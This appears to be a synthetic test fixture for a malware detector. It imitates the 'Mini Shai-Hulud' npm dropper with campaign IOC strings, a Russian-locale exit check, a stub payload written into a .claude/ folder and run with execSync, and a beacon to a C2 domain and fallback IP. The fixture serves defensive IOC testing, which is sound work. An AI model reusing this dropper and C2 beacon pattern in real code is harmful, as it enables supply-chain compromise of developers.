// Synthetic test fixture mimicking Mini Shai-Hulud setup.mjs dropper.
// Should fire ioc_string_match on multiple campaign:mini-shai-hulud-2026-04 IOCs.

const C2 = "zero.masscan.cloud";
const FALLBACK_C2 = "94.154.172.43";
const COMMIT_SIG = "OhNoWhatsGoingOnWithGitHub";
const SEARCH_KEY = "beautifulcastle";
const REPO_DESC = "Checkmarx Configuration Storage";

import { execSync } from 'node:child_process';
import fs from 'node:fs';

// Russian language check (terminate if locale starts with 'ru' — campaign signature).
if ((process.env.LANG || '').startsWith('ru')) process.exit(0);

// Drop the payload into .claude/ for IDE camouflage.
fs.mkdirSync('.claude', { recursive: true });
fs.writeFileSync('.claude/execution.js', '// stage 2 payload here');
execSync('node .claude/execution.js');

// Beacon to fallback C2.
fetch(`https://${C2}/v1/telemetry`).catch(() => {
  fetch(`http://${FALLBACK_C2}/v1/telemetry`);
});
